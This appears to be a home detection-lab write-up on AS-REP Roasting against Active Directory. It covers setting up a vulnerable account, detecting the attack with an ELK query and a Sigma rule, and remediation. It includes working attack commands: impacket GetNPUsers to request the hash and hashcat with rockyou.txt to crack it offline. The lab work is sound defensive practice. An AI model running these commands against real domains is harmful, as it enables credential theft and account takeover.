# INC-002 — AS-REP Roasting

> **Status:** ✅ Completed — 2026-08-12
> **MITRE ATT&CK:** [T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/)
> **Difficulty:** Low
> **Prerequisites:** Network access to DC, knowledge of a vulnerable username

---

## Overview

AS-REP Roasting exploits Active Directory accounts that have Kerberos pre-authentication disabled (`DoesNotRequirePreAuth = true`). When pre-auth is disabled, the Domain Controller will respond to a TGT request from **any unauthenticated user** with an AS-REP encrypted using the target account's password hash. This encrypted blob can be taken offline and cracked without ever triggering an account lockout.

---

## Lab Environment

| Component | Value |
|-----------|-------|
| Domain | `soc.lab` |
| DC Hostname | `SOC-Lab-DC` |
| DC IP | `172.16.0.5` |
| Attacker (Kali) | `172.16.0.11` |
| Vulnerable Account | `svc_asrep` |
| Account Password | `<LAB_PASSWORD>` — intentionally weak, wordlist-crackable. **Lab use only. Never reuse.** |
| Tool Used | Impacket `GetNPUsers.py` |

---

## Prerequisites Checklist

- [x] **Check 1** — Vulnerable AD user with `DoesNotRequirePreAuth = true`
  ```powershell
  Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select Name, SamAccountName
  ```
- [x] **Check 2** — Kerberos audit policy enabled (verified directly, not via GPO)
  ```cmd
  auditpol /get /subcategory:"Kerberos Authentication Service"
  # Expected: Success and Failure
  ```
- [x] **Check 3** — Winlogbeat shipping `Security` channel to ELK, 4768 confirmed in index
  - Winlogbeat path: `C:\winlogbeat\winlogbeat.yml`
  - Security channel confirmed on line 29
  - Index: `winlogbeat-2026.08.12`
- [x] **Check 4** — Clock skew between DC and Kali < 5 minutes
  - Installed `chrony` on Kali, synced to DC (172.16.0.5)
  - Verified offset: `0.000002620s` — zero drift

---

## Setup — Creating the Vulnerable Account

```powershell
# Run on DC as Administrator
New-ADUser -Name "svc_asrep" -SamAccountName "svc_asrep" `
  -UserPrincipalName "svc_asrep@soc.lab" -Enabled $true `
  -AccountPassword (ConvertTo-SecureString "<LAB_PASSWORD>" -AsPlainText -Force) `
  -PasswordNeverExpires $true

Set-ADAccountControl -Identity "svc_asrep" -DoesNotRequirePreAuth $true

# Verify
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select Name, SamAccountName
```

> ⚠️ **Lab note:** Use a password confirmed in `rockyou.txt` (e.g. `Password1`) so the offline crack step is reproducible. This account is intentionally misconfigured for detection lab purposes only.

---

## Attack Execution

### Step 1 — Request AS-REP Hash (Kali)

```bash
impacket-GetNPUsers soc.lab/svc_asrep -no-pass -dc-ip 172.16.0.5
```

**Expected output:**
```
$krb5asrep$23$svc_asrep@SOC.LAB:<HASH_REDACTED>
```

The `$23$` prefix confirms **RC4-HMAC (etype 0x17)** encryption — the weak cipher Impacket requests by default and the detection signal in ELK.

### Step 2 — Offline Password Crack (Kali)

```bash
hashcat -m 18200 '<HASH_REDACTED>' /usr/share/wordlists/rockyou.txt --force
```

**Expected result:** `Status: Cracked` — password recovered with no lockout, no AD interaction.

> 💡 If rockyou.txt is compressed: `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`

---

## Detection

### ELK Query (Kibana Discover)

```
event.code: "4768" AND winlog.event_data.TicketEncryptionType: "0x17"
```

### Key Event Fields

| Field | Value | Significance |
|-------|-------|--------------|
| `event.code` | `4768` | Kerberos TGT request |
| `TicketEncryptionType` | `0x17` | RC4 — attacker-requested weak cipher |
| `PreAuthType` | `0` | Confirms PreAuth was disabled on account |
| `TargetUserName` | `svc_asrep` | Targeted account |
| `IpAddress` | `::ffff:172.16.0.11` | Attacker source IP (Kali) |
| `winlog.channel` | `Security` | Source log channel |
| `agent.name` | `SOC-Lab-DC` | Originating host |

### Sigma Rule

See: [`configs/detection-rules/sigma-inc002-asrep-roasting.yml`](../configs/detection-rules/sigma-inc002-asrep-roasting.yml)

---

## Hardening / Remediation

See: [`playbooks/lab-hardening.md`](../playbooks/lab-hardening.md) — Section: AD Hardening → INC-002

Quick fix:
```powershell
# Re-enable pre-authentication on the account
Set-ADAccountControl -Identity svc_asrep -DoesNotRequirePreAuth $false

# Audit all accounts with PreAuth disabled
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select Name, SamAccountName
```
